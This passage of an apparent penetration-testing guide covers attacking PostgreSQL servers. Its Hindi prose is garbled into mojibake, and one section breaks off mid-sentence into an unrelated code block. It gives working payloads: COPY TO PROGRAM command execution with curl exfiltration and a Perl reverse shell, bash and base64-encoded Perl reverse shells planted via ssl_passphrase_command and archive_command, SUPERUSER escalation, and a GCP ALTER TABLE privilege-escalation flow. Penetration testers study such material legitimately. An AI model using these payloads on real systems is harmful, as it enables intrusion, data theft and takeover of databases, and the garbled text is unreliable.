рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╣реАрдВ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **`CREATEROLE`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рддреЛ рдЖрдк **рдЦреБрдж рдХреЛ рдЙрд╕ рд╕рдореВрд╣ рдХрд╛ рд╕рджрд╕реНрдп рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:**
```sql
GRANT pg_write_server_files TO username;
```
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ COPY рдиреНрдпреВрд▓рд╛рдЗрди рдЪрд╛рд░реНрд╕ рдХреЛ рд╣реИрдВрдбрд▓ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдПрдХ рдмреЗрд╕64 рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдПрдХ-рд▓рд╛рдЗрдирд░ рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред\
рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдПрдХ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реАрдорд╛ рд╣реИ рдХрд┐ **`copy` рдХрд╛ рдЙрдкрдпреЛрдЧ рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдХреБрдЫ рдмрд╛рдЗрдирд░реА рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред**

### **рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ**

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдмрдбрд╝реА рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдиреНрдп рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдореЗрдВ **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ, рд╣реИрдХрд░реНрд╕ рдХреЗ рд▓рд┐рдП**! рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдЖрдЬ рд╣реА, рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рдЬреЛ рддрдХрд░реАрдмрди **$100,000** рддрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рд▓рд┐рдП RCE**

[9.3 рд╕рдВрд╕реНрдХрд░рдг](https://www.postgresql.org/docs/9.3/release-9-3.html) рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░, рдХреЗрд╡рд▓ **рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдФрд░ рд╕рдореВрд╣ **`pg_execute_server_program`** рдХреЗ рд╕рджрд╕реНрдп copy рдХрд╛ рдЙрдкрдпреЛрдЧ RCE рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдирд┐рдХрд╛рд╕реА рдХреЗ рд╕рд╛рде):
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
рдЙрджрд╛рд╣рд░рдг рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╣реАрдВ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **`CREATEROLE`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рддреЛ рдЖрдк **рдЦреБрдж рдХреЛ рдЙрд╕ рд╕рдореВрд╣ рдХрд╛ рд╕рджрд╕реНрдп рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:**
```sql
GRANT pg_execute_server_program TO username;
```
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

рдпрд╛ **metasploit** рд╕реЗ `multi/postgres/postgres_copy_from_program_cmd_exec` рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред\
рдЗрд╕ рджреБрд░реНрдмрд▓рддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [**рдпрд╣рд╛рдВ**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) рдорд┐рд▓реЗрдЧреАред CVE-2019-9193 рдХреЗ рд░реВрдк рдореЗрдВ рд░рд┐рдкреЛрд░реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди Postges рдиреЗ рдЗрд╕реЗ [рд╕реБрд╡рд┐рдзрд╛ рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдареАрдХ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)ред

### PostgreSQL рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд╕рд╛рде RCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQL рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде RCE

рдкрд┐рдЫрд▓реЗ рдкреЛрд╕реНрдЯ рд╕реЗ рдЬрдм рдЖрдкрдиреЗ **рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╕реАрдЦрд╛** рд╣реЛрдЧрд╛, рддреЛ рдЖрдк **RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП postgresql рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдФрд░ рдЙрд╕реЗ рд▓реЛрдб рдХрд░рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ RCE

Postgresql рдХреА **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓** postgres рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп** рд╣реЛрддреА рд╣реИ, рдЬреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП **рд╕реБрдкрд░рдпреВрдЬрд░** рдХреЗ рд░реВрдк рдореЗрдВ рдЖрдк рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЗрд╕рд▓рд┐рдП рдЖрдк рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

![](<../.gitbook/assets/image (303).png>)

#### **ssl\_passphrase\_command рдХреЗ рд╕рд╛рде RCE**

рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреБрдЫ рд░реБрдЪрд┐рдХрд░ рдЧреБрдг рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ RCE рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдкрде
* `ssl_passphrase_command = ''` рдпрджрд┐ рдирд┐рдЬреА рдлрд╝рд╛рдЗрд▓ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ (рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб) рддреЛ postgresql рдЗрд╕ рдЧреБрдг рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрдорд╛рдВрдб рдХреЛ **рдЪрд▓рд╛рдПрдЧрд╛**ред
* `ssl_passphrase_command_supports_reload = off` рдпрджрд┐ рдпрд╣ рдЧреБрдг **рдЪрд╛рд▓реВ** рд╣реИ рддреЛ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдП рдЧрдП **рдХрдорд╛рдВрдб** рдХреЛ `pg_reload_conf()` **рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рдлрд┐рд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЪрд╛рд╣рд┐рдП:

1. рд╕рд░реНрд╡рд░ рд╕реЗ **рдирд┐рдЬреА рдХреБрдВрдЬреА рдбрдВрдк** рдХрд░реЗрдВ
2. рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд░реЗрдВ:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдВ**
4. рдореМрдЬреВрджрд╛ postgresql **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдХреЛ **рдбрдВрдк** рдХрд░реЗрдВ
5. рдЙрдкрд░реЛрдХреНрдд рдЧреБрдгреЛрдВ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдВ**:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()` рдХреЛ рдЪрд▓рд╛рдПрдБ

рдЗрд╕реЗ рдЯреЗрд╕реНрдЯ рдХрд░рддреЗ рд╕рдордп рдореБрдЭреЗ рдзреНрдпрд╛рди рдЖрдпрд╛ рдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ рддрдм рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЬрдм **рдирд┐рдЬреА рдХреБрдВрдЬреА рдлрд╝рд╛рдЗрд▓ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдВ 640 рд╣реЛрдВ**, рдпрд╣ **рд░реВрдЯ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡** рд╣реЛ рдФрд░ **рд╕рдореВрд╣ ssl-cert рдпрд╛ postgres** (рддрд╛рдХрд┐ postgres рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рдкрдврд╝ рд╕рдХреЗ) рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╣реЛ, рдФрд░ _/var/lib/postgresql/12/main_ рдореЗрдВ рд╕реНрдерд╛рдирд┐рдд рд╣реЛред

рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ [**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ**](https://pulsesecurity.co.nz/articles/postgres-sqli)** рдорд┐рд▓реЗрдЧреАред**

#### **archive\_command рдХреЗ рд╕рд╛рде RCE**

рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдФрд░ рдЧреБрдг рд╣реИ рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд╣ рд╣реИ `archive_command`ред

рдЗрд╕рдХреЗ рд▓рд┐рдП, `archive_mode` рд╕реЗрдЯрд┐рдВрдЧ `'on'` рдпрд╛ `'always'` рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рдРрд╕рд╛ рд╣реИ, рддреЛ рд╣рдо `archive_command` рдореЗрдВ рдХрдорд╛рдВрдб рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ WAL (write-ahead logging) рдСрдкрд░реЗрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╕рд╛рдорд╛рдиреНрдп рдЪрд░рдг рд╣реИрдВ:

1. рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЕрднрд┐рд▓реЗрдЦ рдореЛрдб рд╕рдХреНрд╖рдо рд╣реИ: `SELECT current_setting('archive_mode')`
2. `archive_command` рдХреЛ рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд░реАрд▓реЛрдб рдХрд░реЗрдВ: `SELECT pg_reload_conf()`
4. WAL рдСрдкрд░реЗрд╢рди рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдВ, рдЬреЛ рдЖрд░реНрдХрд╛рдЗрд╡ рдХрдорд╛рдВрдб рдХреЛ рдмреБрд▓рд╛рдПрдЧрд╛: `SELECT pg_switch_wal()` рдпрд╛ рдХреБрдЫ рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП `SELECT pg_switch_xlog()`

рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### рдкрд╛рд╕рд╡рд░реНрдб рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ

рдЗрд╕ рд░реЛрд▓ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреНрдп **рдиреЙрди-рд╕реБрдкрд░рдпреВрдЬрд░реНрд╕** рдХреЗ **рдкрд╛рд╕рд╡рд░реНрдб** рдХреЛ рднреА **рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

рдпрд╣ рдХрд╛рдлреА рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдХрд┐ **рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ PostgreSQL рдореЗрдВ рдХреЛрдИ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рджрд╛рди рдХрд┐рдП рдмрд┐рдирд╛ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдиреЗ **рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реА рд╣реЛрддреА рд╣реИ**, рддреЛ рдЖрдк рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рдкрд╛рд╕ **`SUPERUSER`** рднреВрдорд┐рдХрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
рдпрд╣ рдЖрдорддреМрд░ рдкрд░ **`pg_hba.conf`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЗ рдХрд╛рд░рдг рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE рдкреНрд░рд╛рдЗрд╡реЗрд╕реНрдХ**

[рдЗрд╕ **рд▓реЗрдЦ**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ Postgres GCP рдореЗрдВ ALTER TABLE рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдЗрд╡реЗрд╕реНрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ред

рдЬрдм рдЖрдк рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЗрд╕реЗ рд░реЛрдХрдиреЗ рд╡рд╛рд▓реА рдПрдХ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓рдиреА рдЪрд╛рд╣рд┐рдП, рд▓реЗрдХрд┐рди рдЬрд╛рд╣рд┐рд░ рд╣реИ рдХрд┐ GCP рдиреЗ рдЗрд╕ **рд╡рд┐рдХрд▓реНрдк** рдХреЛ GCP рдореЗрдВ рд╕реБрдкрд░рдпреВрдЬрд░ рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджрд┐рдпрд╛ рдерд╛:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ рд╡рд┐рдЪрд╛рд░ рдХреЛ рдЬреЛрдбрд╝рдХрд░ рдХрд┐ рдЬрдм рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдХ рдЗрдВрдбреЗрдХреНрд╕ рдлрдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде INSERT/UPDATE/ANALYZE рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдХрдорд╛рдВрдб рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдлрдВрдХреНрд╢рди рдХреЛ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде **рдХреЙрд▓** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рдлрдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдПрдХ рдЗрдВрдбреЗрдХреНрд╕ рдмрдирд╛рдпрд╛ рдЬрд╛рдП рдФрд░ рдЙрд╕ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ рдХреЛ рд╕реБрдкрд░рдпреВрдЬрд░ рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рджрд┐рдП рдЬрд╛рдПрдВ, рдФрд░ рдлрд┐рд░ рдЙрд╕ рддрд╛рд▓рд┐рдХрд╛ рдкрд░ ANALYZE рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рджреБрд╖реНрдЯ рдлрдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдорд╛рд▓рд┐рдХ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### рд╢реЛрд╖рдг

1. рдПрдХ рдирдпрд╛ рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рдПрдВред
2. рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдХреБрдЫ рдбрдореА рд╕рд╛рдордЧреНрд░реА рдбрд╛рд▓реЗрдВ, рддрд╛рдХрд┐ рдЗрдВрдбреЗрдХреНрд╕ рдХрд╛рд░реНрдп рдХреБрдЫ рдХрд╛рдо рдХрд░ рд╕рдХреЗред
3. рддрд╛рд▓рд┐рдХрд╛ рдкрд░ рдПрдХ рджреБрд╖реНрдЯ рдЗрдВрдбреЗрдХреНрд╕ рдХрд╛рд░реНрдп (рд╣рдорд╛рд░реЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде) рдмрдирд╛рдПрдВред
4. рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ рдХреЛ ALTER рдХрд░реЗрдВ cloudsqladmin, GCP рдХреА рд╕реБрдкрд░рдпреВрдЬрд░ рднреВрдорд┐рдХрд╛, рдЬрд┐рд╕реЗ рдХреЗрд╡рд▓ рдХреНрд▓рд╛рдЙрдб SQL рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
5. рддрд╛рд▓рд┐рдХрд╛ рдХреЛ ANALYZE рдХрд░реЗрдВ, PostgreSQL рдЗрдВрдЬрди рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рд╕рдВрджрд░реНрдн рдХреЛ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ (cloudsqladmin) рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░рдиреЗ рдФрд░ cloudsqladmin рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рджреБрд╖реНрдЯ рдЗрдВрдбреЗрдХреНрд╕ рдХрд╛рд░реНрдп рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рд╕реЗ рд╣рдорд╛рд░реЗ рд╢реЗрд▓ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬрд┐рд╕реЗ рд╣рдореЗрдВ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рдереАред

PostgreSQL рдореЗрдВ, рдпрд╣ рдлреНрд▓реЛ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

